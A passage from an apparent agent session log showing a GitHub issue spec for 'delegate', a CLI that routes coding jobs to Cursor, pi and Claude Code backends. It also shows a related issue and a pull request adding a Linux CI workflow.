server\\nstate:\\tOPEN\\nauthor:\\tuser (Amogh Akshintala)\\nlabels:\\tready-for-agent\\ncomments:\\t1\\nassignees:\\t\\nprojects:\\t\\nmilestone:\\t\\nissue-type:\\t\\nparent:\\t\\nsub-issues:\\t\\nsub-issues-completed:\\t\\nblocked-by:\\t\\nblocking:\\t\\nnumber:\\t4\\n--\\n## Problem Statement\\n\\ncursor-delegate lets a host agent hand work to Cursor's models, but only Cursor's, and only from hosts that load its MCP server. The models I actually use are spread across three harnesses: Cursor (Composer, Grok), pi (ChatGPT-subscription GPT models, opencode-go models) and Claude Code (Claude on the Max plan). None of them can reach the others' models.\\n\\nThe tool has also grown more surface than it uses. Across 413 real `cursor_run` calls, every one ran in the background, `plan` capability was never used, `allowPartialCommit` and `idleMs` were never set, `cursor_wait_any` ran twice, and several parameters (`verifyCommands`, `promptPreamble`, `requireNonClaude`, the `allowUnsandboxed` second signal) only add prompt text or guard against cases that never happen. Eight MCP tools and fourteen run parameters cost schema tokens in every session and make the skill long.\\n\\nRunning as an MCP server adds its own costs: one resident process per host session, job state that dies with the session, a write lock that cannot see writes from another session, and per-harness registration (Claude plugin, Codex plugin manifest).\\n\\n## Solution\\n\\nReplace the `cursor-delegate` MCP server with a CLI called `delegate`, plus one skill. Any harness with a shell can call it. Every configured model is reachable from every harness, routed to one of three backends: cursor-agent, pi, or Claude Code.\\n\\n`delegate run` starts a job and returns its id immediately. Each job runs under its own detached supervisor that writes a per-job status file. Callers wait with `delegate watch` run in the background and read results from the status file. A finished job can be continued with `delegate resume`. The run surface shrinks to the parameters that real use needs.\\n\\n## User Stories\\n\\n1. As an orchestrating agent, I want to start a delegated job with one shell command, so that I can delegate from any harness that has a shell.\\n2. As an orchestrating agent, I want `delegate run` to print the job id and return at once, so that my turn is never blocked on a model.\\n3. As an orchestrating agent, I want to pass the prompt on stdin or from a file, so that long briefs need no shell quoting.\\n4. As an orchestrating agent, I want to choose a model by id, so that the backend follows from the model without a separate flag.\\n5. As an orchestrating agent, I want a default model when I omit one, so that cheap bulk work needs no extra flag.\\n6. As an orchestrating agent, I want an unknown model id rejected with the list of valid ids, so that a typo fails fast.\\n7. As an orchestrating agent, I want `read-only` and `read-write` capabilities, so that I can say whether a delegate may change files.\\n8. As an orchestrating agent, I want `read-only` to be the default, so that a forgotten flag never grants writes.\\n9. As an orchestrating agent, I want a pi model with `read-only` rejected, so that I never believe a pi run is read-only when pi cannot enforce it.\\n10. As an orchestrating agent, I want to set the delegate's working directory, so that it works in a worktree or scratch directory I prepared.\\n11. As an orchestrating agent, I want the working directory to default to where I ran the command, so that the common case needs no flag.\\n12. As an orchestrating agent, I want a second read-write job in the same directory refused with BUSY, so that two delegates never interleave edits.\\n13. As an orchestrating agent, I want that lock to hold across separate host sessions, so that two Claude sessions cannot collide in one tree.\\n14. As an orchestrating agent, I want to give a gate command the tool runs after the agent, so that I get ground-truth verification instead of the delegate's claim.\\n15. As an orchestrating agent, I want a failing gate to downgrade DONE to DONE_WITH_CONCERNS with the gate's output, so that I see what failed.\\n16. As an orchestrating agent, I want the result to include the git change-set the tool computed, so that I know what actually changed.\\n17. As an orchestrating agent, I want a concern when commits landed but the tree is still dirty, so that half-committed work is visible.\\n18. As an orchestrating agent, I want to widen the tool-call idle window for one job, so that a long build or benchmark is not killed as hung.\\n19. As an orchestrating agent, I want a job that goes silent past its idle window killed and reported, so that hung jobs end on their own.\\n20. As an orchestrating agent, I want to wait on one or many jobs with `delegate watch` in a background shell, so that my turn can end and I get one notification when they finish.\\n21. As an orchestrating agent, I want `delegate watch` to print every job's final record, so that one command both waits and delivers results.\\n22. As an orchestrating agent, I want `delegate watch` to stop at a timeout, so that a missing or never-written record cannot hang it forever.\\n23. As an orchestrating agent, I want to read a job's progress by reading its status file, so that polling needs no tool.\\n24. As an orchestrating agent, I want the status file to carry a heartbeat while running, so that I can tell a dead supervisor from a slow job.\\n25. As an orchestrating agent, I want the final status file to hold the full result (status, text, usage, cost, change-set, gate result, session), so that the file is the whole answer.\\n26. As an orchestrating agent, I want the delegate's final STATUS line to set the result status, including NEEDS_CONTEXT, so that I know when it needs me.\\n27. As an orchestrating agent, I want to resume any finished job with a follow-up prompt, so that I can answer a question or ask for fixes without re-briefing.\\n28. As an orchestrating agent, I want resume to reuse the job's model, directory, capability and gate, so that I cannot forget a setting on the follow-up.\\n29. As an orchestrating agent, I want to override capability, gate or model on resume, so that a read-only reviewer can go on to fix what it found.\\n30. As an orchestrating agent, I want a model override that crosses backends rejected, so that I never try to resume a cursor session in pi.\\n31. As an orchestrating agent, I want resume to work after the host session or machine sleep, until reboot, so that follow-ups do not depend on a live server.\\n32. As an orchestrating agent, I want resume to return a new job id, so that each run has its own record.\\n33. As an orchestrating agent, I want to cancel a job by id, so that I can stop a runaway delegate and the commands it started.\\n34. As an orchestrating agent, I want `delegate models` to list ids, labels, backends and prices, so that I can pick a model without reading config.\\n35. As a user, I want to see per-run cost, so that I know what delegation would cost at list prices.\\n36. As a user, I want cursor runs priced from the model table and pi and claude runs to report their own cost, so that no backend's pricing is reimplemented.\\n37. As a user, I want prices for every model in the model table, so that `delegate models` shows them all.\\n38. As a user, I want `delegate doctor` to check each backend's binary, version and login, so that setup problems show before a run fails.\\n39. As a user, I want doctor to check each configured model is available on its backend, so that renamed or retired models (Grok 4.6 to 4.7) show as warnings.\\n40. As a user, I want pi and Claude Code to run with my full configuration (extensions, plugins, skills, context files), so that delegates behave as they do when I run them.\\n41. As a user, I want cursor read-write runs unsandboxed, so that delegates can clone, push and open PRs.\\n42. As a user, I want Claude Code read-write runs in auto permission mode, so that its classifier still screens tool calls.\\n43. As a user, I want Claude Code read-only runs in plan permission mode, so that they cannot edit.\\n44. As a user, I want the model list trimmed to models I use, so that the menu is short.\\n45. As a user, I want Composer 2.5, Grok 4.7 high and xhigh from cursor; muse-spark-1.3-contributor, glm-5.3-flash, deepseek-v4.1-flash from opencode-go via pi; gpt-6-astra, gpt-6-luna, gpt-6.1-sol from openai-codex via pi; and Claude Opus 5.5, Sonnet 5.5, Fable 5.1 via Claude Code.\\n46. As a user, I want the project renamed from cursor-delegate to delegate everywhere (binary, config directory, environment variable, status-file directory, skill, repo), so that the name matches what it does.\\n47. As a user, I want my existing host profile moved to the new config location by setup, so that my settings survive the rename.\\n48. As a user, I want setup to build the binary and put `delegate` on my PATH, so that every harness can call it.\\n49. As a user, I want the skill to show briefs that say \\\"do not delegate further\\\", so that a delegated Claude does not loop back through delegate.\\n50. As a user, I want my global instructions to allow local Opus 5.5 and Sonnet 5.5 subagents and route other delegation through `delegate`, so that the Max plan is used where it fits.\\n51. As a user, I want the skill to make the background watcher the waiting path, so that agents stop holding turns open.\\n52. As a user, I want the skill rewritten for the new surface (catalog, model picks, resume, gates, watcher), so that it stays the single source of usage guidance.\\n53. As a maintainer, I want each backend to own its argument building, capability mapping, output parsing, resume method and doctor checks, so that adding a harness touches one place.\\n54. As a maintainer, I want parsers tested against output recorded from real headless runs, so that a CLI upgrade that changes its stream breaks a test.\\n55. As a maintainer, I want opt-in live tests per backend that also record fresh fixtures, so that fixtures stay current.\\n56. As a maintainer, I want latency budgets on every command, so that performance regressions fail tests.\\n57. As a maintainer, I want a memory budget on the per-job supervisor, so that a job's footprint stays small.\\n58. As a maintainer, I want CI on Linux running format, lint and tests, so that breakage on my other platform is caught; macOS runs locally.\\n59. As a maintainer, I want dead docs (old reproduction spec, July/August plans and specs, code review notes) and the parity snapshot removed, so that the repo describes only what exists.\\n\\n## Implementation Decisions\\n\\n**Surface.** The MCP server is removed. The CLI is:\\n\\n```\\ndelegate run    --model M [--capability read-only|read-write] [--cwd D] [--gate CMD] [--tool-idle-ms N] [--prompt-file F | stdin]\\ndelegate resume <jobId> [--model M] [--capability C] [--gate CMD] [--prompt-file F | stdin]\\ndelegate cancel <jobId>\\ndelegate watch  <jobId>... [--timeout S]\\ndelegate doctor\\ndelegate models\\n```\\n\\nRemoved with no replacement: `cursor_poll`, `cursor_wait`, `cursor_wait_any`, `cursor_wait_all`, `cursor_answer`; parameters `waitMs`, `background`, `session`, `isolation`, `verifyCommands`, `allowPartialCommit`, `idleMs`, `requireNonClaude`, `allowUnsandboxed`; capabilities `plan` and `write-unsandboxed`; host-profile fields `promptPreamble`, `verifyCommands`, `requiredDeny`, `deadlineMs`; the deny-list check; BackendProvided worktrees; MCP progress notifications; the `family` model field; the doctor plugin-registration and legacy-name checks.\\n\\n**Job model.** `run` validates input, writes the initial status record, spawns a detached supervisor (own session and process group, stdio redirected), prints the job id and exits. The supervisor runs the backend child, the idle watchdog, the gate and the git change-set, and writes the status record at start, on a heartbeat while running, and at the terminal transition. The status record is the source of truth for every command after `run`; there is no in-memory registry.\\n\\n**Status record.** One JSON file per job in `$TMPDIR/delegate-jobs/`. While running: status, heartbeat timestamp, progress snapshot, supervisor pid. When terminal: status and the full result. It also stores what resume needs: backend session id, model, cwd, capability, gate, tool-idle window. Records live until reboot and are not cleaned up.\\n\\n**Write lock.** A lock file per resolved `cwd`, held by the supervisor of a read-write job. A second read-write `run` or `resume` in the same `cwd` returns BUSY with the holder's job id. Works across host sessions.\\n\\n**Resume.** Reads the job's status record, applies overrides, rejects a model override on a different backend, and starts a new job continuing the backend session. Works on any terminal status.\\n\\n**Cancel.** Reads the supervisor pid from the record and signals its process group; the record ends CANCELLED.\\n\\n**Watch.** Blocks until every named record is terminal or the timeout passes, then prints each record. No external dependencies.\\n\\n**Backends.** Selected by a `backend` field on each model in the model table. Each backend provides: binary resolution, argument building from (model, capability, cwd, session), a stream parser that yields the existing progress snapshot and a normalized result (text, session id, usage, optional reported cost, error), a resume method, and doctor checks.\\n\\n- **cursor**: `cursor-agent --print --output-format stream-json --trust --approve-mcps --force`. read-only is ask mode; read-write is `--sandbox disabled`. Resume by the session id from the result line. Cost from the model table.\\n- **pi**: `pi -p --mode json --model provider/id`, full user configuration loaded. Session id chosen before launch with `--session-id`; resume reuses it. read-only is rejected. Cost is pi's own reported cost.\\n- **claude**: `claude -p --output-format stream-json --verbose --model ...`, full user configuration loaded. Session id chosen before launch with `--session-id`; resume with `--resume`. read-only is `--permission-mode plan`; read-write is `--permission-mode auto`. Cost is the result line's `total_cost_usd`. The stream closely matches cursor's, so the parser should share most of cursor's.\\n\\n**Model table.** Bundled JSON: `default` plus, per id, `{label, backend, price}`. Prices are kept for every model for display; only cursor uses them to compute cost. Pi model ids use pi's `provider/model` form. Default is `composer-2.5`. Grok 4.7 ids are `grok-4.7-high` / `grok-4.7-xhigh` (no `cursor-` prefix), priced as Grok 4.6.\\n\\n**Prompt composition.** The tool adds only the STATUS-line instruction to the caller's prompt; the result status is parsed from that line.\\n\\n**Doctor.** Plugin/binary version; per backend: binary found, version, login (cursor `about`, pi `auth check`, claude equivalent); per model: available on its backend (cursor `--list-models`, pi `auth check --model`). Missing models are warnings.\\n\\n**Rename.** Binary `delegate`; config at `~/.config/delegate/` with `DELEGATE_HOST_PROFILE` override; setup moves the old profile file. The Claude plugin ships the skill only. The Codex plugin manifest is dropped since nothing needs registering. The GitHub repo and local directory were renamed on 2026-10-01. The user's global agent instructions and agent memory are updated to the new names.\\n\\n**Skill.** Rewritten for the CLI: model picks and catalog over the new ids, read-only/read-write, cwd, gates, resume with overrides, the background `delegate watch` as the only documented waiting path, and a \\\"do not delegate further\\\" line for briefs. The plan-writer brief points at resume.\\n\\n**Delivery order.** (1) CLI conversion with all trims and the rename, cursor only, plus CI; (2) backend split behind the interface; (3) pi backend; (4) claude backend.\\n\\n## Testing Decisions\\n\\nA good test drives the `delegate` binary as a real process and asserts on what a caller sees: command output, exit status, and status-file contents. It does not reach into internal modules.\\n\\n- **Primary seam: the CLI against fake agent binaries.** Extends the existing end-to-end tests, which already run the real binary with a shell-script fake cursor-agent selected by an environment variable. Each backend gets a fake that replays a recorded stream. Covers run/detach, BUSY across processes, watchdog kill, gate pass/fail, change-set, NEEDS_CONTEXT, resume with and without overrides, cross-backend override rejection, resume after the original process is gone, cancel killing the process group, watch timeout, doctor, models.\\n- **Parser seam: one per backend, on recorded headless output.** Prior art: the cursor adapter's stream tests. Fixtures are raw stdout captured from real headless runs, not stored session files (pi session files, Claude transcripts and Cursor chat stores are different formats). Use past sessions to choose realistic tasks to record: long tool output, many tool calls, resume, errors.\\n- **Live tests, opt-in.** One real round trip per backend, ignored by default, like the existing live test. They save raw stdout as fresh fixtures. They also settle two open behaviours: whether headless plan mode in Claude answers rather than proposing a plan, and how often auto mode refuses calls.\\n- **Latency budgets.** Every command is timed against fake agents. `run` returning its job id matters most. Budgets are set at about 3x the local measurement so CI noise does not trip them.\\n- **Memory budget.** The supervisor's resident memory is measured while a fake agent runs. Replaces the old idle-server memory gate.\\n- **CI.** GitHub Actions on Linux: format check, clippy with warnings as errors, tests. Live tests excluded. macOS runs locally. The suite currently takes about 5 seconds warm, 5 seconds clean build.\\n\\n## Out of Scope\\n\\n- A separate Codex backend; Codex models are reached through pi's openai-codex provider.\\n- Fiber as a backend (waits for `fiber ask`).\\n- Sandboxing any backend, or a seatbelt wrapper for pi.\\n- Read-only mode for pi.\\n- Server-created worktrees; callers create their own and pass `--cwd`.\\n- Cleanup of old status records.\\n- Reading pi's model catalog at runtime for prices.\\n- Tiered (long-context) pricing in the model table.\\n- Keeping MCP as a second interface.\\n\\n## Further Notes\\n\\n- Usage numbers come from 413 deduplicated `cursor_run` calls in local Claude transcripts.\\n- Headless Claude auto mode cannot prompt, so calls its classifier will not auto-approve are refused. If that proves frequent, revisit.\\n- If headless plan mode misbehaves, fall back to blocking the edit tools for read-only Claude runs.\\n- A delegated Claude or pi loads this skill and the user's global instructions, so briefs must say \\\"do not delegate further\\\" to stop loops.\\n- Superseded design notes: the multi-backend idea doc, which this spec replaces.\",\"is_error\":false}]},\"parent_tool_use_id\":null,\"session_id\":\"26c5e6c8-864e-4d87-8aa1-c1ca5a12b9c9\",\"uuid\":\"4d456178-f0db-42af-a381-5b967990b31d\",\"timestamp\":\"2026-10-01T08:23:07.923Z\",\"tool_use_result\":{\"stdout\":\"title:\\tci: Linux workflow (fmt, clippy, tests) (#8)\\nstate:\\tDRAFT\\nauthor:\\tuser (Amogh Akshintala)\\nlabels:\\t\\nassignees:\\t\\nreviewers:\\t\\nprojects:\\t\\nmilestone:\\t\\nnumber:\\t19\\nurl:\\thttps://github.com/user/delegate/pull/19\\nadditions:\\t23\\ndeletions:\\t0\\nauto-merge:\\tdisabled\\n--\\nFixes #8\\n\\nOne `ci` job on `ubuntu-latest` for pull requests and pushes to `main`: `cargo fmt --check`, `cargo clippy --all-targets -- -D warnings`, `cargo test`. Ignored live tests stay excluded. Every action is pinned by SHA, the token is read-only, and `pull_request_target` is not used.\\n\\nImplemented by composer-2.5 via `scripts/record.sh` (fixture lands with #18).\\n\\nCo-authored with Claude Code.\\ndiff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml\\nnew file mode 100644\\nindex 0000000..ede11d5\\n--- /dev/null\\n+++ b/.github/workflows/ci.yml\\n@@ -0,0 +1,23 @@\\n+name: CI\\n+\\n+on:\\n+  push:\\n+    branches: [main]\\n+  pull_request:\\n+\\n+permissions:\\n+  contents: read\\n+\\n+jobs:\\n+  ci:\\n+    runs-on: ubuntu-latest\\n+    steps:\\n+      - uses: actions/checkout@fbc6f3992d24b796d5a048ff273f7fcc4a7b6c09 # v5\\n+      - uses: dtolnay/rust-toolchain@6bed0761d98439e5a578e2877258200ad565ba87 # stable\\n+        with:\\n+          toolchain: stable\\n+          components: rustfmt, clippy\\n+      - uses: Swatinem/rust-cache@6323deb102c322ba6fcbdcafc7e3dddab59af2b6 # v2.9.2\\n+      - run: cargo fmt --check\\n+      - run: cargo clippy --all-targets -- -D warnings\\n+      - run: cargo test\\ntitle:\\tCI on Linux\\nstate:\\tOPEN\\nauthor:\\tuser (Amogh Akshintala)\\nlabels:\\tready-for-agent\\ncomments:\\t0\\nassignees:\\t\\nprojects:\\t\\nmilestone:\\t\\nissue-type:\\t\\nparent:\\t\\nsub-issues:\\t\\nsub-issues-completed:\\t\\nblocked-by:\\tuser/delegate#6\\nblocking:\\t\\nnumber:\\t8\\n--\\n## Parent\\n\\n#4\\n\\n## What to build\\n\\nGitHub Actions CI on Linux (`ubuntu-latest`) running the format check, clippy with warnings as errors, and the test suite, on every push and pull request. Live tests stay excluded. macOS is tested locally.\\n\\nDrive this ticket's implementation through the recording script, saving the run as a fixture.\\n\\n## Acceptance criteria\\n\\n- [ ] The workflow runs on pull requests and on pushes to main.\\n- [ ] It passes on the current code, or the Linux-only failures it surfaces are fixed.\\n- [ ] Ignored live tests are not run.\\n\\n## Blocked by\\n\\n- #6 Record headless fixtures (recording script and probes)\\ntitle:\\tSpec: delegate, a multi-backend CLI replacing the cursor-delegate MCP server\\nstate:\\tOPEN\\nauthor:\\tuser (Amogh Akshintala)\\nlabels:\\tready-for-agent\\ncomments:\\t1\\nassignees:\\t\\nprojects:\\t\\nmilestone:\\t\\nissue-type:\\t\\nparent:\\t\\nsub-issues:\\t\\nsub-issues-completed:\\t\\nblocked-by:\\t\\nblocking:\\t\\nnumber:\\t4\\n--\\n## Problem Statement\\n\\ncursor-delegate lets a host agent hand work to Cursor's models, but only Cursor's, and only from hosts that load its MCP server. The models I actually use are spread across three harnesses: Cursor (Composer, Grok), pi (ChatGPT-subscription GPT models, opencode-go models) and Claude Code (Claude on the Max plan). None of them can reach the others' models.\\n\\nThe tool has also grown more surface than it uses. Across 413 real `cursor_run` calls, every one ran in the background, `plan` capability was never used, `allowPartialCommit` and `idleMs` were never set, `cursor_wait_any` ran twice, and several parameters (`verifyCommands`, `promptPreamble`, `requireNonClaude`, the `allowUnsandboxed` second signal) only add prompt text or guard against cases that never happen. Eight MCP tools and fourteen run parameters cost schema tokens in every session and make the skill long.\\n\\nRunning as an MCP server adds its own costs: one resident process per host session, job state that dies with the session, a write lock that cannot see writes from another session, and per-harness registration (Claude plugin, Codex plugin manifest).\\n\\n## Solution\\n\\nReplace the `cursor-delegate` MCP server with a CLI called `delegate`, plus one skill. Any harness with a shell can call it. Every configured model is reachable from every harness, routed to one of three backends: cursor-agent, pi, or Claude Code.\\n\\n`delegate run` starts a job and returns its id immediately. Each job runs under its own detached supervisor that writes a per-job status file. Callers wait with `delegate watch` run in the background and read results from the status file. A finished job can be continued with `delegate resume`. The run surface shrinks to the parameters that real use needs.\\n\\n## User Stories\\n\\n1. As an orchestrating agent, I want to start a delegated job with one shell command, so that I can delegate from any harness that has a shell.\\n2. As an orchestrating agent, I want `delegate run` to print the job id and return at once, so that my turn is never blocked on a model.\\n3. As an orchestrating agent, I want to pass the prompt on stdin or from a file, so that long briefs need no shell quoting.\\n4. As an orchestrating agent, I want to choose a model by id, so that the backend follows from the model without a separate flag.\\n5. As an orchestrating agent, I want a default model when I omit one, so that cheap bulk work needs no extra flag.\\n6. As an orchestrating agent, I want an unknown model id rejected with the list of valid ids, so that a typo fails fast.\\n7. As an orchestrating agent, I want `read-only` and `read-write` capabilities, so that I can say whether a delegate may change files.\\n8. As an orchestrating agent, I want `read-only` to be the default, so that a forgotten flag never grants writes.\\n9. As an orchestrating agent, I want a pi model with `read-only` rejected, so that I never believe a pi run is read-only when pi cannot enforce it.\\n10. As an orchestrating agent, I want to set the delegate's working directory, so that it works in a worktree or scratch directory I prepared.\\n11. As an orchestrating agent, I want the working directory to default to where I ran the command, so that the common case needs no flag.\\n12. As an orchestrating agent, I want a second read-write job in the same directory refused with BUSY, so that two delegates never interleave edits.\\n13. As an orchestrating agent, I want that lock to hold across separate host sessions, so that two Claude sessions cannot collide in one tree.\\n14. As an orchestrating agent, I want to give a gate command the tool runs after the agent, so that I get ground-truth verification instead of the delegate's claim.\\n15. As an orchestrating agent, I want a failing gate to downgrade DONE to DONE_WITH_CONCERNS with the gate's output, so that I see what failed.\\n16. As an orchestrating agent, I want the result to include the git change-set the tool computed, so that I know what actually changed.\\n17. As an orchestrating agent, I want a concern when commits landed but the tree is still dirty, so that half-committed work is visible.\\n18. As an orchestrating agent, I want to widen the tool-call idle window for one job, so that a long build or benchmark is not killed as hung.\\n19. As an orchestrating agent, I want a job that goes silent past its idle window killed and reported, so that hung jobs end on their own.\\n20. As an orchestrating agent, I want to wait on one or many jobs with `delegate watch` in a background shell, so that my turn can end and I get one notification when they finish.\\n21. As an orchestrating agent, I want `delegate watch` to print every job's final record, so that one command both waits and delivers results.\\n22. As an orchestrating agent, I want `delegate watch` to stop at a timeout, so that a missing or never-written record cannot hang it forever.\\n23. As an orchestrating agent, I want to read a job's progress by reading its status file, so that polling needs no tool.\\n24. As an orchestrating agent, I want the status file to carry a heartbeat while running, so that I can tell a dead supervisor from a slow job.\\n25. As an orchestrating agent, I want the final status file to hold the full result (status, text, usage, cost, change-set, gate result, session), so that the file is the whole answer.\\n26. As an orchestrating agent, I want the delegate's final STATUS line to set the result status, including NEEDS_CONTEXT, so that I know when it needs me.\\n27. As an orchestrating agent, I want to resume any finished job with a follow-up prompt, so that I can answer a question or ask for fixes without re-briefing.\\n28. As an orchestrating agent, I want resume to reuse the job's model, directory, capability and gate, so that I cannot forget a setting on the follow-up.\\n29. As an orchestrating agent, I want to override capability, gate or model on resume, so that a read-only reviewer can go on to fix what it found.\\n30. As an orchestrating agent, I want a model override that crosses backends rejected, so that I never try to resume a cursor session in pi.\\n31. As an orchestrating agent, I want resume to work after the host session or machine sleep, until reboot, so that follow-ups do not depend on a live server.\\n32. As an orchestrating agent, I want resume to return a new job id, so that each run has its own record.\\n33. As an orchestrating agent, I want to cancel a job by id, so that I can stop a runaway delegate and the commands it started.\\n34. As an orchestrating agent, I want `delegate models` to list ids, labels, backends and prices, so that I can pick a model without reading config.\\n35. As a user, I want to see per-run cost, so that I know what delegation would cost at list prices.\\n36. As a user, I want cursor runs priced from the model table and pi and claude runs to report their own cost, so that no backend's pricing is reimplemented.\\n37. As a user, I want prices for every model in the model table, so that `delegate models` shows them all.\\n38. As a user, I want `delegate doctor` to check each backend's binary, version and login, so that setup problems show before a run fails.\\n39. As a user, I want doctor to check each configured model is available on its backend, so that renamed or retired models (Grok 4.6 to 4.7) show as warnings.\\n40. As a user, I want pi and Claude Code to run with my full configuration (extensions, plugins, skills, context files), so that delegates behave as they do when I run them.\\n41. As a user, I want cursor read-write runs unsandboxed, so that delegates can clone, push and open PRs.\\n42. As a user, I want Claude Code read-write runs in auto permission mode, so that its classifier still screens tool calls.\\n43. As a user, I want Claude Code read-only runs in plan permission mode, so that they cannot edit.\\n44. As a user, I want the model list trimmed to models I use, so that the menu is short.\\n45. As a user, I want Composer 2.5, Grok 4.7 high and xhigh from cursor; muse-spark-1.3-contributor, glm-5.3-flash, deepseek-v4.1-flash from opencode-go via pi; gpt-6-astra, gpt-6-luna, gpt-6.1-sol from openai-codex via pi; and Claude Opus 5.5, Sonnet 5.5, Fable 5.1 via Claude Code.\\n46. As a user, I want the project renamed from cursor-delegate to delegate everywhere (binary, config directory, environment variable, status-file directory, skill, repo), so that the name matches what it does.\\n47. As a user, I want my existing host profile moved to the new config location by setup, so that my settings survive the rename.\\n48. As a user, I want setup to build the binary and put `delegate` on my PATH, so that every harness can call it.\\n49. As a user, I want the skill to show briefs that say \\\"do not delegate further\\\", so that a delegated Claude does not loop back through delegate.\\n50. As a user, I want my global instructions to allow local Opus 5.5 and Sonnet 5.5 subagents and route other delegation through `delegate`, so that the Max plan is used where it fits.\\n51. As a user, I want the skill to make the background watcher the waiting path, so that agents stop holding turns open.\\n52. As a user, I want the skill rewritten for the new surface (catalog, model picks, resume, gates, watcher), so that it stays the single source of usage guidance.\\n53. As a maintainer, I want each backend to own its argument building, capability mapping, output parsing, resume method and doctor checks, so that adding a harness touches one place.\\n54. As a maintainer, I want parsers tested against output recorded from real headless runs, so that a CLI upgrade that changes its stream breaks a test.\\n55. As a maintainer, I want opt-in live tests per backend that also record fresh fixtures, so that fixtures stay current.\\n56. As a maintainer, I want latency budgets on every command, so that performance regressions fail tests.\\n57. As a maintainer, I want a memory budget on the per-job supervisor, so that a job's footprint stays small.\\n58. As a maintainer, I want CI on Linux running format, lint and tests, so that breakage on my other platform is caught; macOS runs locally.\\n59. As a maintainer, I want dead docs (old reproduction spec, July/August plans and specs, code review notes) and the parity snapshot removed, so that the repo describes only what exists.\\n\\n## Implementation Decisions\\n\\n**Surface.** The MCP server is removed. The CLI is:\\n\\n```\\ndelegate run    --model M [--capability read-only|read-write] [--cwd D] [--gate CMD] [--tool-idle-ms N] [--prompt-file F | stdin]\\ndelegate resume <jobId> [--model M] [--capability C] [--gate CMD] [--prompt-file F | stdin]\\ndelegate cancel <jobId>\\ndelegate watch  <jobId>... [--timeout S]\\ndelegate doctor\\ndelegate models\\n```\\n\\nRemoved with no replacement: `cursor_poll`, `cursor_wait`, `cursor_wait_any`, `cursor_wait_all`, `cursor_answer`; parameters `waitMs`, `background`, `session`, `isolation`, `verifyCommands`, `allowPartialCommit`, `idleMs`, `requireNonClaude`, `allowUnsandboxed`; capabilities `plan` and `write-unsandboxed`; host-profile fields `promptPreamble`, `verifyCommands`, `requiredDeny`, `deadlineMs`; the deny-list check; BackendProvided worktrees; MCP progress notifications; the `family` model field; the doctor plugin-registration and legacy-name checks.\\n\\n**Job model.** `run` validates input, writes the initial status record, spawns a detached supervisor (own session and process group, stdio redirected), prints the job id and exits. The supervisor runs the backend child, the idle watchdog, the gate and the git change-set, and writes the status record at start, on a heartbeat while running, and at the terminal transition. The status record is the source of truth for every command after `run`; there is no in-memory registry.\\n\\n**Status record.** One JSON file per job in `$TMPDIR/delegate-jobs/`. While running: status, heartbeat timestamp, progress snapshot, supervisor pid. When terminal: status and the full result. It also stores what resume needs: backend session id, model, cwd, capability, gate, tool-idle window. Records live until reboot and are not cleaned up.\\n\\n**Write lock.** A lock file per resolved `cwd`, held by the supervisor of a read-write job. A second read-write `run` or `resume` in the same `cwd` returns BUSY with the holder's job id. Works across host sessions.\\n\\n**Resume.** Reads the job's status record, applies overrides, rejects a model override on a different backend, and starts a new job continuing the backend session. Works on any terminal status.\\n\\n**Cancel.** Reads the supervisor pid from the record and signals its process group; the record ends CANCELLED.\\n\\n**Watch.** Blocks until every named record is terminal or the timeout passes, then prints each record. No external dependencies.\\n\\n**Backends.** Selected by a `backend` field on each model in the model table. Each backend provides: binary resolution, argument building from (model, capability, cwd, session), a stream parser that yields the existing progress snapshot and a normalized result (text, session id, usage, optional reported cost, error), a resume method, and doctor checks.\\n\\n- **cursor**: `cursor-agent --print --output-format stream-json --trust --approve-mcps --force`. read-only is ask mode; read-write is `--sandbox disabled`. Resume by the session id from the result line. Cost from the model table.\\n- **pi**: `pi -p --mode json --model provider/id`, full user configuration loaded. Session id chosen before launch with `--session-id`; resume reuses it. read-only is rejected. Cost is pi's own reported cost.\\n- **claude**: `claude -p --output-format stream-json --verbose --model ...`, full user configuration loaded. Session id chosen before launch with `--session-id`; resume with `--resume`. read-only is `--permission-mode plan`; read-write is `--permission-mode auto`. Cost is the result line's `total_cost_usd`. The stream closely matches cursor's, so the parser should share most of cursor's.\\n\\n**Model table.** Bundled JSON: `default` plus, per id, `{label, backend, price}`. Prices are kept for every model for display; only cursor uses them to compute cost. Pi model ids use pi's `provider/model` form. Default is `composer-2.5`. Grok 4.7 ids are `grok-4.7-high` / `grok-4.7-xhigh` (no `cursor-` prefix), priced as Grok 4.6.\\n\\n**Prompt composition.** The tool adds only the STATUS-line instruction to the caller's prompt; the result status is parsed from that line.\\n\\n**Doctor.** Plugin/binary version; per backend: binary found, version, login (cursor `about`, pi `auth check`, claude equivalent); per model: available on its backend (cursor `--list-models`, pi `auth check --model`). Missing models are warnings.\\n\\n**Rename.** Binary `delegate`; config at `~/.config/delegate/` with `DELEGATE_HOST_PROFILE` override; setup moves the old profile file. The Claude plugin ships the skill only. The Codex plugin manifest is dropped since nothing needs registering. The GitHub repo and local directory were renamed on 2026-10-01. The user's global agent instructions and agent memory are updated to the new names.\\n\\n**Skill.** Rewritten for the CLI: model picks and catalog over the new ids, read-only/read-write, cwd, gates, resume with overrides, the background `delegate watch` as the only documented waiting path, and a \\\"do not delegate further\\\" line for briefs. The plan-writer brief points at resume.\\n\\n**Delivery order.** (1) CLI conversion with all trims and the rename, cursor only, plus CI; (2) backend split behind the interface; (3) pi backend; (4) claude backend.\\n\\n## Testing Decisions\\n\\nA good test drives the `delegate` binary as a real process and asserts on what a caller sees: command output, exit status, and status-file contents. It does not reach into internal modules.\\n\\n- **Primary seam: the CLI against fake agent binaries.** Extends the existing end-to-end tests, which already run the real binary with a shell-script fake cursor-agent selected by an environment variable. Each backend gets a fake that replays a recorded stream. Covers run/detach, BUSY across processes, watchdog kill, gate pass/fail, change-set, NEEDS_CONTEXT, resume with and without overrides, cross-backend override rejection, resume after the original process is gone, cancel killing the process group, watch timeout, doctor, models.\\n- **Parser seam: one per backend, on recorded headless output.** Prior art: the cursor adapter's stream tests. Fixtures are raw stdout captured from real headless runs, not stored session files (pi session files, Claude transcripts and Cursor chat stores are different formats). Use past sessions to choose realistic tasks to record: long tool output, many tool calls, resume, errors.\\n- **Live tests, opt-in.** One real round trip per backend, ignored by default, like the existing live test. They save raw stdout as fresh fixtures. They also settle two open behaviours: whether headless plan mode in Claude answers rather than proposing a plan, and how often auto mode refuses calls.\\n- **Latency budgets.** Every command is timed against fake agents. `run` returning its job id matters most. Budgets are set at about 3x the local measurement so CI noise does not trip them.\\n- **Memory budget.** The supervisor's resident memory is measured while a fake agent runs. Replaces the old idle-server memory gate.\\n- **CI.** GitHub Actions on Linux: format check, clippy with warnings as errors, tests. Live tests excluded. macOS runs locally. The suite currently takes about 5 seconds warm, 5 seconds clean build.\\n\\n## Out of 